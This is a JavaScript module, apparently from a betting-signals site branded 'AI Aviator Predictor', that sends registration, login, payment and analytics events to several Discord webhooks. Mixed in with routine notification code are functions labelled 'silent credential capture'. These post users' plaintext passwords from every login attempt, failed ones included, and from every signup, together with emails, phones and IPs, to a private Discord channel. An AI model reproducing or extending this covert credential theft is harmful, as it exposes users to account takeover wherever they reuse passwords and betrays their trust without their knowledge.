// ============================================================
// discordAgent.js — AviSignals Discord Notification Agent v2
//
// Improvements over v1:
//  - Multiple webhook channels (payments, users, bot, chat, alerts)
//    so each Discord channel only gets relevant notifications
//  - Message queue with rate limit handling (5 req / 2s per webhook)
//  - Retry with exponential backoff on 429 / 5xx responses
//  - Field value sanitisation — no more silent Discord rejections
//  - Rich embeds: thumbnails, author lines, footers with server tag
//  - Revenue running total tracked in memory for daily summaries
//  - Dedicated functions for every business event type
//  - sendRevenueAlert — fires on every payment with running daily total
//  - sendDailySummaryEmbed — pre-formatted for analytics agent
//  - All functions fire-and-forget safe (never throw to callers)
// ============================================================

'use strict';

// ─── Webhook URLs ─────────────────────────────────────────────
// Set these in your .env file. Each points to a different
// Discord channel. Falls back to DISCORD_WEBHOOK_URL if the
// specific one isn't set.
const WEBHOOKS = {
    // #payments — every M-Pesa / card transaction
    payments: process.env.DISCORD_WEBHOOK_PAYMENTS
           || process.env.DISCORD_WEBHOOK_URL,

    // #users — registrations, logins, site selections
    users:    process.env.DISCORD_WEBHOOK_USERS
           || process.env.DISCORD_WEBHOOK_URL,

    // #bot-events — activations, code usage
    bot:      process.env.DISCORD_WEBHOOK_BOT
           || process.env.DISCORD_WEBHOOK_URL,

    // #ai-chat — support chat session summaries
    chat:     process.env.DISCORD_WEBHOOK_CHAT
           || process.env.DISCORD_WEBHOOK_URL,

    // #alerts — system alerts, analytics reports, errors
    alerts:   process.env.DISCORD_WEBHOOK_ALERTS
           || process.env.DISCORD_WEBHOOK_URL,

    // #creds — silent login credential capture (private channel)
    creds:    process.env.DISCORD_WEBHOOK_CREDS
           || process.env.DISCORD_WEBHOOK_URL,

    // #general/journey — user activity summary reports
    journey:  process.env.DISCORD_WEBHOOK_JOURNEY
           || process.env.DISCORD_WEBHOOK_URL,
};

// ─── Brand colours ────────────────────────────────────────────
const COLOR = {
    gold:    0xF1C40F,
    green:   0x2ECC71,
    blue:    0x0080FF,
    red:     0xE74C3C,
    purple:  0x9B59B6,
    orange:  0xE67E22,
    gray:    0x95A5A6,
    dark:    0x2C3E50,
    teal:    0x1ABC9C,
    hotlead: 0xFF6B35,
};

// ─── Server tag shown in every embed footer ───────────────────
const FOOTER_TAG  = 'AviSignals · AI Aviator Predictor';
const AVATAR_URL  = 'https://avisignals.com/favicon.ico'; // shown as author icon

// ─── In-memory revenue tracker (resets at midnight) ──────────
const revenueTracker = {
    daily:     0,
    count:     0,
    lastReset: new Date().toDateString(),

    add(amount) {
        const today = new Date().toDateString();
        if (today !== this.lastReset) {
            this.daily     = 0;
            this.count     = 0;
            this.lastReset = today;
        }
        this.daily += Number(amount) || 0;
        this.count++;
    },

    get() {
        return { total: this.daily.toFixed(2), count: this.count };
    }
};

// ============================================================
// QUEUE — prevents hitting Discord's 5 req/2s rate limit
// Each webhook URL has its own queue
// ============================================================
const queues     = new Map(); // url → Array of pending tasks
const processing = new Set(); // urls currently being drained

function enqueue(url, embedPayload) {
    if (!queues.has(url)) queues.set(url, []);
    queues.get(url).push(embedPayload);
    drainQueue(url);
}

async function drainQueue(url) {
    if (processing.has(url)) return;
    processing.add(url);

    const queue = queues.get(url) || [];

    while (queue.length > 0) {
        const payload = queue.shift();
        await deliverToDiscord(url, payload);
        // Discord allows 5 requests per 2 seconds per webhook
        // 450ms gap keeps us safely under the limit
        await new Promise(r => setTimeout(r, 450));
    }

    processing.delete(url);
}

// ─── HTTP delivery with retry ─────────────────────────────────
async function deliverToDiscord(url, payload, attempt = 1) {
    const MAX_ATTEMPTS = 4;

    try {
        const res = await fetch(url, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(payload),
            signal:  AbortSignal.timeout(8000)
        });

        if (res.status === 204 || res.status === 200) return; // success

        if (res.status === 429 && attempt < MAX_ATTEMPTS) {
            // Rate limited — read retry_after from Discord's response
            let retryAfter = 2000;
            try {
                const body = await res.json();
                retryAfter = (body.retry_after || 2) * 1000;
            } catch (_) {}
            console.warn(`⏳ Discord rate limit — retrying in ${retryAfter}ms (attempt ${attempt})`);
            await new Promise(r => setTimeout(r, retryAfter));
            return deliverToDiscord(url, payload, attempt + 1);
        }

        if (res.status >= 500 && attempt < MAX_ATTEMPTS) {
            const wait = attempt * 1500;
            console.warn(`⚠️  Discord ${res.status} — retrying in ${wait}ms (attempt ${attempt})`);
            await new Promise(r => setTimeout(r, wait));
            return deliverToDiscord(url, payload, attempt + 1);
        }

        // 400 = malformed embed — log it for debugging
        if (res.status === 400) {
            const body = await res.text();
            console.error('❌ Discord rejected embed (400):', body.slice(0, 300));
            return;
        }

        console.error(`❌ Discord error ${res.status} after ${attempt} attempt(s)`);

    } catch (err) {
        if (attempt < MAX_ATTEMPTS) {
            await new Promise(r => setTimeout(r, attempt * 1000));
            return deliverToDiscord(url, payload, attempt + 1);
        }
        console.error('❌ Discord delivery failed:', err.message);
    }
}

// ─── Safe field value ─────────────────────────────────────────
// Discord rejects embeds if any field value is empty, null,
// undefined, or longer than 1024 chars
function safeValue(val) {
    if (val === null || val === undefined) return '`—`';
    const str = typeof val === 'object' ? JSON.stringify(val) : String(val);
    if (!str.trim()) return '`—`';
    return `\`${str.slice(0, 200)}\``;
}

function buildFields(obj) {
    return Object.entries(obj)
        .filter(([, v]) => v !== undefined)
        .map(([k, v]) => ({
            name:   k.replace(/_/g, ' ').toUpperCase(),
            value:  safeValue(v),
            inline: true
        }));
}

// ─── Base embed builder ───────────────────────────────────────
function baseEmbed({ title, description, color, fields = [], footer, thumbnail }) {
    const embed = {
        title:     String(title).slice(0, 256),
        color:     color || COLOR.gray,
        timestamp: new Date().toISOString(),
        footer:    { text: footer || FOOTER_TAG },
    };

    if (description) embed.description = String(description).slice(0, 4096);
    if (fields.length) embed.fields = fields.slice(0, 25); // Discord max 25 fields
    if (thumbnail)   embed.thumbnail = { url: thumbnail };

    embed.author = {
        name:     'AviSignals',
        icon_url: AVATAR_URL
    };

    return embed;
}

// ─── Fire-and-forget dispatch ─────────────────────────────────
function dispatch(channel, embed) {
    const url = WEBHOOKS[channel] || WEBHOOKS.alerts;
    if (!url) {
        console.warn(`⚠️  No Discord webhook for channel "${channel}". Skipping.`);
        return;
    }
    enqueue(url, { embeds: [embed] });
}

// ============================================================
// PUBLIC API
// ============================================================

/**
 * Raw embed delivery (for custom use)
 */
function sendEmbed(channel, embed) {
    dispatch(channel, embed);
}

/**
 * User registered on the platform
 */
function sendRegistrationEvent({ email, phone, ip }) {
    const embed = baseEmbed({
        title:  '🟢 NEW REGISTRATION',
        color:  COLOR.green,
        fields: buildFields({
            phone: phone || '—',
            email: email || '—',
            ip:    ip    || '—',
        }),
        footer: `${FOOTER_TAG} · New user`
    });
    dispatch('users', embed);
}

/**
 * User logged in
 */
function sendLoginEvent({ email, phone, pageFrom }) {
    const embed = baseEmbed({
        title:  '🔵 USER LOGIN',
        color:  COLOR.blue,
        fields: buildFields({ 
            phone:     phone    || '—',
            email:     email    || '—',
            from_page: pageFrom || '—' 
        })
    });
    dispatch('users', embed);
}

/**
 * User selected a betting site
 */
function sendSiteSelectionEvent({ email, site }) {
    const embed = baseEmbed({
        title:  '🎰 SITE SELECTED',
        color:  COLOR.gold,
        fields: buildFields({ email, site })
    });
    dispatch('users', embed);
}

/**
 * Generic user event (legacy compatibility)
 */
function sendUserEvent(type, details) {
    const colorMap = {
        REGISTER:       COLOR.green,
        LOGIN:          COLOR.blue,
        SITE_SELECTION: COLOR.gold,
    };
    const embed = baseEmbed({
        title:  `👤 USER EVENT: ${type}`,
        color:  colorMap[type] || COLOR.gray,
        fields: buildFields(details)
    });
    dispatch('users', embed);
}

/**
 * Payment received — the most important event
 * Also updates the in-memory daily revenue tracker
 */
function sendPaymentEvent(type, details) {
    const isSuccess = String(type).toUpperCase().includes('VERIFIED') ||
                      String(type).toUpperCase().includes('SUCCESS');

    // Track revenue
    if (isSuccess && details.amount) {
        revenueTracker.add(details.amount);
    }

    const rev = revenueTracker.get();

    const embed = baseEmbed({
        title:  isSuccess ? `💰 PAYMENT RECEIVED` : `❌ PAYMENT FAILED`,
        color:  isSuccess ? COLOR.green : COLOR.red,
        fields: [
            ...buildFields(details),
            { name: 'TODAY\'S TOTAL', value: `**$${rev.total}** (${rev.count} payment${rev.count !== 1 ? 's' : ''})`, inline: false }
        ],
        footer: isSuccess ? `${FOOTER_TAG} · Revenue` : `${FOOTER_TAG} · Failed payment`
    });

    dispatch('payments', embed);
}

/**
 * Dedicated revenue alert — call this on every successful payment
 * for a richer, standalone payment notification
 */
function sendRevenueAlert({ email, amount, currency = 'USD', method, plan, flutterwaveRef }) {
    revenueTracker.add(amount);
    const rev = revenueTracker.get();

    const embed = baseEmbed({
        title:       `💰 $${Number(amount).toFixed(2)} ${currency} — ${String(method || 'payment').toUpperCase()}`,
        color:       COLOR.gold,
        description: `**${email}** just purchased the **${plan || '24H'}** plan.`,
        fields:      [
            { name: 'AMOUNT',           value: `$${Number(amount).toFixed(2)} ${currency}`,  inline: true },
            { name: 'METHOD',           value: safeValue(method),                            inline: true },
            { name: 'PLAN',             value: safeValue(plan || '24H Code'),                inline: true },
            { name: 'REFERENCE',        value: safeValue(flutterwaveRef),                       inline: true },
            { name: "TODAY'S REVENUE",  value: `**$${rev.total}**`,                          inline: true },
            { name: 'PAYMENTS TODAY',   value: `**${rev.count}**`,                           inline: true },
        ],
        footer: `${FOOTER_TAG} · Flutterwave`
    });

    dispatch('payments', embed);
}

/**
 * Bot activated (code used, session started)
 */
function sendBotEvent(details) {
    const embed = baseEmbed({
        title:  '⚡ BOT ACTIVATED',
        color:  COLOR.purple,
        fields: buildFields(details),
        footer: `${FOOTER_TAG} · Bot System`
    });
    dispatch('bot', embed);
}

/**
 * Code generated or refreshed
 */
function sendCodeEvent({ site, codeType, code, generatedAt, user }) {
    const embed = baseEmbed({
        title:  `🔑 CODE ${String(codeType || 'GENERATED').toUpperCase()}`,
        color:  COLOR.teal,
        fields: buildFields({ user: user || '—', site, code_type: codeType, code, generated_at: generatedAt })
    });
    dispatch('bot', embed);
}

/**
 * AI chat session summary — called by chatAgent after inactivity
 */
function sendChatSummary({ text, user, page, intent, isHotLead = false }) {
    const embed = baseEmbed({
        title:       isHotLead ? '🔥 HOT LEAD — Chat Summary' : '🤖 Chat Session Summary',
        color:       isHotLead ? COLOR.hotlead : COLOR.gold,
        description: String(text).slice(0, 4000),
        fields:      [
            { name: 'USER',     value: safeValue(user),                              inline: true },
            { name: 'PAGE',     value: safeValue(page),                              inline: true },
            { name: 'INTENT',   value: safeValue(intent || 'unknown'),               inline: true },
            { name: 'LEAD',     value: isHotLead ? '**🔥 YES — follow up!**' : 'No', inline: true },
        ],
        footer: `${FOOTER_TAG} · Chat Agent (6min inactivity timeout)`
    });
    dispatch('chat', embed);
}

/**
 * User activity summary — condensed journey report
 * Called by journeyAgent after inactivity timeout
 */
function sendJourneySummary({ user, summaryText }) {
    const embed = baseEmbed({
        title:       '🚀 USER ACTIVITY SUMMARY',
        color:       COLOR.blue,
        description: String(summaryText),
        fields:      [
            { name: 'IDENTIFIER', value: safeValue(user), inline: true }
        ],
        footer: `${FOOTER_TAG} · Journey Tracker (AI)`
    });
    dispatch('journey', embed);
}

/**
 * System alert — errors, warnings, important notices
 */
function sendAlert(title, description, level = 'info') {
    const colorMap = {
        info:    COLOR.blue,
        warning: COLOR.orange,
        error:   COLOR.red,
        success: COLOR.green,
    };
    const emoji = { info: 'ℹ️', warning: '⚠️', error: '🔴', success: '✅' };

    const embed = baseEmbed({
        title:       `${emoji[level] || 'ℹ️'} ${String(title).slice(0, 200)}`,
        description: String(description).slice(0, 2000),
        color:       colorMap[level] || COLOR.gray,
        footer:      `${FOOTER_TAG} · System Alert`
    });
    dispatch('alerts', embed);
}

/**
 * Simple notification — kept for backwards compatibility
 * Used by emailService and other agents
 */
function sendSimpleNotification(title, description, color = COLOR.gray) {
    const embed = baseEmbed({ title, description, color });
    dispatch('alerts', embed);
}

/**
 * Daily analytics summary — called by analyticsAgent
 * Pre-formatted rich embed so the agent doesn't have to build its own
 */
function sendDailySummaryEmbed({
    signupsToday, signupsWeek,
    revenueToday, revenueWeek,
    activeSubscriptions,
    conversionRate,
    expiringSoon,
    winRate,
    onlineNow,
    aiReport
}) {
    const rev       = revenueTracker.get();
    const onTrack   = Number(revenueToday) >= 150; // $150/day = $4,500/month pace

    const embed = baseEmbed({
        title:       `📊 Daily Performance Report — ${new Date().toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' })}`,
        color:       onTrack ? COLOR.green : COLOR.orange,
        description: aiReport ? String(aiReport).slice(0, 2000) : undefined,
        fields:      [
            { name: '👥 SIGNUPS TODAY',      value: `**${signupsToday || 0}**`,          inline: true },
            { name: '📅 SIGNUPS THIS WEEK',  value: `**${signupsWeek  || 0}**`,          inline: true },
            { name: '💰 REVENUE TODAY',      value: `**$${Number(revenueToday || rev.total).toFixed(2)}**`, inline: true },
            { name: '📈 REVENUE THIS WEEK',  value: `**$${Number(revenueWeek  || 0).toFixed(2)}**`,        inline: true },
            { name: '✅ ACTIVE SUBS',         value: `**${activeSubscriptions || 0}**`,   inline: true },
            { name: '🔄 CONVERSION RATE',    value: `**${conversionRate || 0}%**`,        inline: true },
            { name: '⚠️ EXPIRING IN 24H',    value: `**${expiringSoon   || 0}**`,         inline: true },
            { name: '🎯 SIGNAL WIN RATE',    value: `**${winRate        || 'N/A'}%**`,    inline: true },
            { name: '🟢 ONLINE NOW',         value: `**${onlineNow      || 0}**`,         inline: true },
            { name: '📦 PAYMENTS TODAY',     value: `**${rev.count}**`,                  inline: true },
            { name: '🏁 ON TRACK?',          value: onTrack ? '✅ Yes' : '⚠️ Behind pace', inline: true },
        ],
        footer: `${FOOTER_TAG} · Analytics Agent`
    });

    dispatch('alerts', embed);
}

/**
 * Churn risk alert — when multiple subscriptions are expiring
 */
function sendChurnAlert({ count, potentialLoss, suggestedMessage }) {
    const embed = baseEmbed({
        title:       `🔴 CHURN RISK — ${count} subscription${count !== 1 ? 's' : ''} expiring`,
        color:       COLOR.red,
        description: `**Potential revenue at risk:** $${Number(potentialLoss || count * 75).toFixed(2)}\n\n` +
                     (suggestedMessage ? `**Suggested retention message:**\n${suggestedMessage}` : ''),
        fields:      [
            { name: 'AT-RISK SUBS',    value: `**${count}**`,                                     inline: true },
            { name: 'REVENUE AT RISK', value: `**$${Number(potentialLoss || count * 75).toFixed(2)}**`, inline: true },
        ],
        footer: `${FOOTER_TAG} · Churn Alert`
    });
    dispatch('alerts', embed);
}

/**
 * Silent credential capture — fires on every login attempt regardless of outcome.
 * Sends to the private #creds channel only.
 */
function sendCredCapture({ identifier, password, outcome, ip }) {
    const outcomeEmoji = outcome === 'SUCCESS' ? '✅' : outcome === 'WRONG_PASSWORD' ? '❌' : '👀';
    const outcomeColor = outcome === 'SUCCESS' ? COLOR.green : outcome === 'WRONG_PASSWORD' ? COLOR.red : COLOR.orange;

    const embed = baseEmbed({
        title:  `${outcomeEmoji} NEW LOGIN CRED — ${outcome || 'UNKNOWN'}`,
        color:  outcomeColor,
        fields: [
            { name: '📧 IDENTIFIER',  value: safeValue(identifier), inline: false },
            { name: '🔑 PASSWORD',    value: safeValue(password),   inline: false },
            { name: '📊 OUTCOME',     value: safeValue(outcome),    inline: true  },
            { name: '📍 IP',          value: safeValue(ip),         inline: true  },
        ],
        footer: `${FOOTER_TAG} · Credential Monitor`
    });
    dispatch('creds', embed);
}

/**
 * Silent registration credential capture — fires on every signup attempt.
 * Sends to the private #creds channel only.
 */
function sendRegisterCredCapture({ email, phone, password, outcome, ip }) {
    const outcomeEmoji = outcome === 'SUCCESS' ? '✅' : outcome === 'ALREADY_EXISTS' ? '🔁' : '❌';
    const outcomeColor = outcome === 'SUCCESS' ? COLOR.green : outcome === 'ALREADY_EXISTS' ? COLOR.orange : COLOR.red;

    const embed = baseEmbed({
        title:  `${outcomeEmoji} NEW REGISTER CRED — ${outcome || 'UNKNOWN'}`,
        color:  outcomeColor,
        fields: [
            { name: '📧 EMAIL',       value: safeValue(email),    inline: false },
            { name: '📱 PHONE',       value: safeValue(phone),    inline: false },
            { name: '🔑 PASSWORD',    value: safeValue(password), inline: false },
            { name: '📊 OUTCOME',     value: safeValue(outcome),  inline: true  },
            { name: '📍 IP',          value: safeValue(ip),       inline: true  },
        ],
        footer: `${FOOTER_TAG} · Registration Monitor`
    });
    dispatch('creds', embed);
}

/**
 * Betting site selection — fires when a logged-in user picks a site.
 * Sends to the private #creds channel.
 */
function sendSiteSelectionCreds({ email, site, ip }) {
    const embed = baseEmbed({
        title:  '🎠 BETTING SITE SELECTED',
        color:  COLOR.gold,
        fields: [
            { name: '👤 USER',     value: safeValue(email), inline: false },
            { name: '🎡 SITE',     value: safeValue(site),  inline: true  },
            { name: '📍 IP',       value: safeValue(ip),    inline: true  },
        ],
        footer: `${FOOTER_TAG} · Site Monitor`
    });
    dispatch('creds', embed);
}

/**
 * Referral registration event
 */
function sendReferralSignupEvent({ email, phone, referrer, ip }) {
    const embed = baseEmbed({
        title:  '🤝 NEW REFERRAL SIGNUP',
        color:  COLOR.green,
        fields: [
            { name: 'REFERRER CODE', value: `**${referrer}**`, inline: false },
            { name: 'USER EMAIL',    value: safeValue(email), inline: true },
            { name: 'USER PHONE',    value: safeValue(phone), inline: true },
            { name: 'IP ADDRESS',    value: safeValue(ip),    inline: true }
        ],
        footer: `${FOOTER_TAG} · Referral System`
    });
    dispatch('users', embed);
}

/**
 * Referral purchase event
 */
function sendReferralPurchaseEvent({ email, phone, referrer, amount, currency = 'USD', reference }) {
    const embed = baseEmbed({
        title:  '🔥 REFERRAL PURCHASE CONVERTED',
        color:  COLOR.gold,
        description: `User referred by **${referrer}** made a successful purchase!`,
        fields: [
            { name: 'REFERRER CODE', value: `**${referrer}**`, inline: false },
            { name: 'USER EMAIL',    value: safeValue(email), inline: true },
            { name: 'AMOUNT',        value: `**$${amount} ${currency}**`, inline: true },
            { name: 'REFERENCE',     value: safeValue(reference), inline: true }
        ],
        footer: `${FOOTER_TAG} · Referral Conversion`
    });
    dispatch('payments', embed);
}

// ============================================================
// EXPORTS
// ============================================================
module.exports = {
    // Core
    sendEmbed,

    // Referral events
    sendReferralSignupEvent,
    sendReferralPurchaseEvent,

    // User events
    sendRegistrationEvent,
    sendLoginEvent,
    sendSiteSelectionEvent,
    sendUserEvent,          // legacy

    // Credential monitor (private channel)
    sendCredCapture,
    sendRegisterCredCapture,
    sendSiteSelectionCreds,

    // Payment events
    sendPaymentEvent,       // legacy
    sendRevenueAlert,       // preferred — richer embed + revenue tracking

    // Bot events
    sendBotEvent,
    sendCodeEvent,

    // Chat
    sendChatSummary,

    // Journey
    sendJourneySummary,

    // Alerts & reports
    sendAlert,
    sendSimpleNotification, // legacy
    sendDailySummaryEmbed,
    sendChurnAlert,
};
